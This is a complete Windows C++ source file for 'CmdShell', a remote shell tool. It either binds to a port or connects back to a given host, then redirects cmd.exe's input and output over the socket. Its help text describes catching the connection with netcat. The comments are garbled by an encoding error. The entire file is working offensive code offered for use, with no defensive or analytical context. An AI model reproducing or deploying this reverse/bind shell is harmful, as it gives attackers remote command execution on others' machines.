#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")

using namespace std;
SOCKET locals;
STARTUPINFO si;
PROCESS_INFORMATION  pi;
struct sockaddr_in   s_sin;
 
void help(char *cmd)
{
  printf("CmdShell v1.0 ---- Made by Zwell\n");
  printf("\tUsage:%s [host] port\n", cmd);
  printf("\tExample:%s 192.168.0.1 1234\n", cmd);
  printf("\t--On the 192.168.10.1 use the cmd:nc -l -p1234\n");
  printf("\tExample:%s 1234\n", cmd);
  printf("\t--Listen on 1234, when you telnet the 1234port,you'll get the shell.\n");
}
 
void bindconn(int bindport)
{
  locals =WSASocket(AF_INET, SOCK_STREAM, 0, NULL, NULL, NULL);
 
  s_sin.sin_family= AF_INET;
  s_sin.sin_port= htons(bindport);
  s_sin.sin_addr.s_addr= htonl(INADDR_ANY);
 
  if(SOCKET_ERROR == bind(locals, (sockaddr*)&s_sin, sizeof(s_sin)))
  {
    printf("bind wrong.");
    exit(0);
  }
 
  listen(locals,2);
 
  SOCKET as = accept(locals, NULL, NULL);
  if(as == INVALID_SOCKET)
  {
    printf("accept wrong.");
    exit(0);
  }
  si.hStdInput= si.hStdOutput = si.hStdError = (void *)as;
}
 
void getshell(char *host, int port)
{
  int  timeout =3000;
 
  s_sin.sin_family= AF_INET;
  s_sin.sin_port= htons(port);//�󶨷���˶˿�
  cout<<s_sin.sin_port<<endl;
  s_sin.sin_addr.s_addr= inet_addr(host);//�󶨷���˵�ַ
  cout<<s_sin.sin_addr.s_addr<<endl;
 
  /*�����׽���*/
  locals =WSASocket(AF_INET, SOCK_STREAM, 0, NULL, NULL, NULL);
  if(locals == INVALID_SOCKET)
  {
    printf("socket wrong.\n");
    exit(0);
  }
 
  /*���ó�ʱ--recv��recvfrom�����������ʵ�*/
  setsockopt(locals,
             SOL_SOCKET,//�׽��ֲ��
             SO_SNDTIMEO,//���ͳ�ʱ
             (char *)&timeout,
             sizeof(timeout));
  // setsockopt(locals,SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
  if(0 != connect(locals, (struct sockaddr*)&s_sin, sizeof(s_sin)))
  {
    printf("Cann't connect.\n");
    exit(0);
  }
 
  //���ý��̵�������������������ض������������socket����������ؼ��ĵط�
  si.hStdInput= si.hStdOutput = si.hStdError = (void*)locals;
}
 
//void z_main(int argv,char*argc[])   //�����������ˣ�����ָ������Լ��ٳ����С�����ԸĻ���
int main(int argv,char*argc[])
{
  WSADATA wsaData;
 
  if(WSAStartup(MAKEWORD(1,1),&wsaData)!=0)
  {
    printf("WSAStartup wrong\n");
    exit(0);
  }
 
  memset(&s_sin,0, sizeof(s_sin));
  memset(&si,0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags= STARTF_USESTDHANDLES;//ʹ��si���������������
 
  if(argv == 2)
  {
    bindconn(atoi(argc[1]));
  }
  else if(argv == 3)
  {
    getshell(argc[1],atoi(argc[2]));
  }
  else
  {
    help(argc[0]);
    exit(0);
  }
 
  CreateProcess(NULL,"cmd.exe", NULL, NULL, 1, NULL,NULL, NULL, &si, &pi);
}
